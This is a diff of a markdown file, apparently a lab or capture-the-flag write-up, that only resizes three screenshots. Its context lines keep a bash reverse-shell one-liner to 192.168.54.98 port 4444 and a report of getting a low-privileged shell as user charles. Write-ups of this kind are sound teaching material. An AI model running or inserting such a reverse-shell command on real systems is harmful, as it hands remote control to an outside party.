@@ -50,13 +50,13 @@ export JAVA_OPTS="-Xms1000m -Xmx1000m"
 bash -c 'bash -i >& /dev/tcp/192.168.54.98/4444 0>&1'
 ```
 
-<img width="1213" height="664" alt="image" src="https://github.com/user-attachments/assets/9c268a91-5fbd-4cbb-8c93-9a08750f9001" />
+<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/9c268a91-5fbd-4cbb-8c93-9a08750f9001" />
 
-<img width="527" height="251" alt="image" src="https://github.com/user-attachments/assets/6b42da73-2fcf-453b-9041-9ef03f746167" />
+<img width="250" height="125" alt="image" src="https://github.com/user-attachments/assets/6b42da73-2fcf-453b-9041-9ef03f746167" />
 
 Got a low priviledged shell for username charles 
 
-<img width="700" height="119" alt="image" src="https://github.com/user-attachments/assets/393b5a64-e1b7-4517-bc7d-1acf49e3b1ab" />
+<img width="400" height="60" alt="image" src="https://github.com/user-attachments/assets/393b5a64-e1b7-4517-bc7d-1acf49e3b1ab" />
 
 ---
 
